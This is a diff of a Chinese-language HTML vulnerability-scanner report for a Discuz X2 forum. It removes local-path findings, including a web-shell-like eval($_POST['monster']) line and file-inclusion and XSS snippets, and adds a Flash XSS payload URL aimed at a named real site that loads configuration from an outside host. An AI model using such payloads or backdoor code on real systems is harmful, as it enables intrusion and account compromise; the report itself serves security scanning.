@@ -1,7 +1,7 @@
 ﻿<!DOCTYPE html>
 <html lang="zh-CN">
   <head>
-      <title>Report [/usr/local/nginx/discuzx2/]</title>
+      <title>Report [http://rw.baidu.com/]</title>
 	<style>
 		/*!
 		 * Bootstrap v2.2.2
@@ -7306,209 +7306,17 @@
         <div class="accordion-group" id="accordion1">
           <div class="accordion-heading">
               <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion1" href="#collapse1">
-                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">Low</span>
-                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">Information Leakage</span>
-                  <span>api.php</span>
+                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">Medium</span>
+                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">Flass XSS</span>
+                  <span>static/image/common/doodle.swf</span>
             </a>
           </div>
           <div id="collapse1" class="accordion-body collapse" style="height: 0px;">
             <div class="accordion-inner">
-                <h4>漏洞类型:</h4><span class="type">Information Leakage</span>
-                <h4>漏洞风险:</h4><span class="risk">Low</span>
-                <h4>参考Payload:</h4><span class="payload">/usr/local/nginx/discuzx2/api.php</span>
-                <h4>详细描述:</h4><span class="description"></span>
-                <!--<h4>修复建议:</h4><span class="suggestions"></span>-->
-            </div>
-          </div>
-      </div>
-      
-        <div class="accordion-group" id="accordion2">
-          <div class="accordion-heading">
-              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion2" href="#collapse2">
-                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">Medium</span>
-                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">Flass XSS</span>
-                  <span>static/image/common/mp3player.swf</span>
-            </a>
-          </div>
-          <div id="collapse2" class="accordion-body collapse" style="height: 0px;">
-            <div class="accordion-inner">
                 <h4>漏洞类型:</h4><span class="type">Flass XSS</span>
                 <h4>漏洞风险:</h4><span class="risk">Medium</span>
-                <h4>参考Payload:</h4><span class="payload">/usr/local/nginx/discuzx2/static/image/common/mp3player.swf</span>
-                <h4>详细描述:</h4><span class="description">if (_root.file != undefined) { this.playlistURL = _root.file;}</span>
-                <!--<h4>修复建议:</h4><span class="suggestions"></span>-->
-            </div>
-          </div>
-      </div>
-      
-        <div class="accordion-group" id="accordion3">
-          <div class="accordion-heading">
-              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion3" href="#collapse3">
-                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">Medium</span>
-                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">Reflective XSS</span>
-                  <span>source/include/misc/misc_ranklist_activity.php</span>
-            </a>
-          </div>
-          <div id="collapse3" class="accordion-body collapse" style="height: 0px;">
-            <div class="accordion-inner">
-                <h4>漏洞类型:</h4><span class="type">Reflective XSS</span>
-                <h4>漏洞风险:</h4><span class="risk">Medium</span>
-                <h4>参考Payload:</h4><span class="payload">/usr/local/nginx/discuzx2/source/include/misc/misc_ranklist_activity.php</span>
-                <h4>详细描述:</h4><span class="description">$orderby = $_G['gp_orderby'];</span>
-                <!--<h4>修复建议:</h4><span class="suggestions"></span>-->
-            </div>
-          </div>
-      </div>
-      
-        <div class="accordion-group" id="accordion4">
-          <div class="accordion-heading">
-              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion4" href="#collapse4">
-                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">Low</span>
-                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">Information Leakage</span>
-                  <span>source/include/misc/misc_ranklist_index.php</span>
-            </a>
-          </div>
-          <div id="collapse4" class="accordion-body collapse" style="height: 0px;">
-            <div class="accordion-inner">
-                <h4>漏洞类型:</h4><span class="type">Information Leakage</span>
-                <h4>漏洞风险:</h4><span class="risk">Low</span>
-                <h4>参考Payload:</h4><span class="payload">/usr/local/nginx/discuzx2/source/include/misc/misc_ranklist_index.php</span>
+                <h4>参考Payload:</h4><span class="payload">http://rw.baidu.com/static/image/common/doodle.swf?config=http://unikone.github.io/dz.doodle.xml</span>
                 <h4>详细描述:</h4><span class="description"></span>
-                <!--<h4>修复建议:</h4><span class="suggestions"></span>-->
-            </div>
-          </div>
-      </div>
-      
-        <div class="accordion-group" id="accordion5">
-          <div class="accordion-heading">
-              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion5" href="#collapse5">
-                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">Medium</span>
-                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">Flass XSS</span>
-                  <span>static/image/common/stat.swf</span>
-            </a>
-          </div>
-          <div id="collapse5" class="accordion-body collapse" style="height: 0px;">
-            <div class="accordion-inner">
-                <h4>漏洞类型:</h4><span class="type">Flass XSS</span>
-                <h4>漏洞风险:</h4><span class="risk">Medium</span>
-                <h4>参考Payload:</h4><span class="payload">/usr/local/nginx/discuzx2/static/image/common/stat.swf</span>
-                <h4>详细描述:</h4><span class="description">if (_root.file != undefined) { this.playlistURL = _root.file;}</span>
-                <!--<h4>修复建议:</h4><span class="suggestions"></span>-->
-            </div>
-          </div>
-      </div>
-      
-        <div class="accordion-group" id="accordion6">
-          <div class="accordion-heading">
-              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion6" href="#collapse6">
-                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">Medium</span>
-                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">Reflective XSS</span>
-                  <span>source/include/space/space_reward.php</span>
-            </a>
-          </div>
-          <div id="collapse6" class="accordion-body collapse" style="height: 0px;">
-            <div class="accordion-inner">
-                <h4>漏洞类型:</h4><span class="type">Reflective XSS</span>
-                <h4>漏洞风险:</h4><span class="risk">Medium</span>
-                <h4>参考Payload:</h4><span class="payload">/usr/local/nginx/discuzx2/source/include/space/space_reward.php</span>
-                <h4>详细描述:</h4><span class="description">if (empty($_GET['view']) </span>
-                <!--<h4>修复建议:</h4><span class="suggestions"></span>-->
-            </div>
-          </div>
-      </div>
-      
-        <div class="accordion-group" id="accordion7">
-          <div class="accordion-heading">
-              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion7" href="#collapse7">
-                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">Low</span>
-                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">Information Leakage</span>
-                  <span>source/function/function_connect.php</span>
-            </a>
-          </div>
-          <div id="collapse7" class="accordion-body collapse" style="height: 0px;">
-            <div class="accordion-inner">
-                <h4>漏洞类型:</h4><span class="type">Information Leakage</span>
-                <h4>漏洞风险:</h4><span class="risk">Low</span>
-                <h4>参考Payload:</h4><span class="payload">/usr/local/nginx/discuzx2/source/function/function_connect.php</span>
-                <h4>详细描述:</h4><span class="description"></span>
-                <!--<h4>修复建议:</h4><span class="suggestions"></span>-->
-            </div>
-          </div>
-      </div>
-      
-        <div class="accordion-group" id="accordion8">
-          <div class="accordion-heading">
-              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion8" href="#collapse8">
-                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">Medium</span>
-                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">Reflective XSS</span>
-                  <span>test/a.php</span>
-            </a>
-          </div>
-          <div id="collapse8" class="accordion-body collapse" style="height: 0px;">
-            <div class="accordion-inner">
-                <h4>漏洞类型:</h4><span class="type">Reflective XSS</span>
-                <h4>漏洞风险:</h4><span class="risk">Medium</span>
-                <h4>参考Payload:</h4><span class="payload">/usr/local/nginx/discuzx2/test/a.php</span>
-                <h4>详细描述:</h4><span class="description">echo 'hello' . $_GET['hello']</span>
-                <!--<h4>修复建议:</h4><span class="suggestions"></span>-->
-            </div>
-          </div>
-      </div>
-      
-        <div class="accordion-group" id="accordion9">
-          <div class="accordion-heading">
-              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion9" href="#collapse9">
-                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">High</span>
-                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">File Inclusion</span>
-                  <span>test/d.php</span>
-            </a>
-          </div>
-          <div id="collapse9" class="accordion-body collapse" style="height: 0px;">
-            <div class="accordion-inner">
-                <h4>漏洞类型:</h4><span class="type">File Inclusion</span>
-                <h4>漏洞风险:</h4><span class="risk">High</span>
-                <h4>参考Payload:</h4><span class="payload">/usr/local/nginx/discuzx2/test/d.php</span>
-                <h4>详细描述:</h4><span class="description">include 'aaa'. $_GET['a'] . 'php'</span>
-                <!--<h4>修复建议:</h4><span class="suggestions"></span>-->
-            </div>
-          </div>
-      </div>
-      
-        <div class="accordion-group" id="accordion10">
-          <div class="accordion-heading">
-              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion10" href="#collapse10">
-                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">Low</span>
-                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">Information Leakage</span>
-                  <span>test/b.php</span>
-            </a>
-          </div>
-          <div id="collapse10" class="accordion-body collapse" style="height: 0px;">
-            <div class="accordion-inner">
-                <h4>漏洞类型:</h4><span class="type">Information Leakage</span>
-                <h4>漏洞风险:</h4><span class="risk">Low</span>
-                <h4>参考Payload:</h4><span class="payload">/usr/local/nginx/discuzx2/test/b.php</span>
-                <h4>详细描述:</h4><span class="description">empty($_POST['monster']))
-    {
-        eval($_POST['monster'])</span>
-                <!--<h4>修复建议:</h4><span class="suggestions"></span>-->
-            </div>
-          </div>
-      </div>
-      
-        <div class="accordion-group" id="accordion11">
-          <div class="accordion-heading">
-              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion11" href="#collapse11">
-                  <span style="width:100px;display:-moz-inline-box;display:inline-block;">High</span>
-                  <span style="width:200px;display:-moz-inline-box;display:inline-block;">Code Execution</span>
-                  <span>test/b.php</span>
-            </a>
-          </div>
-          <div id="collapse11" class="accordion-body collapse" style="height: 0px;">
-            <div class="accordion-inner">
-                <h4>漏洞类型:</h4><span class="type">Code Execution</span>
-                <h4>漏洞风险:</h4><span class="risk">High</span>
-                <h4>参考Payload:</h4><span class="payload">/usr/local/nginx/discuzx2/test/b.php</span>
-                <h4>详细描述:</h4><span class="description">eval($_POST['monster'])</span>
                 <!--<h4>修复建议:</h4><span class="suggestions"></span>-->
             </div>
           </div>
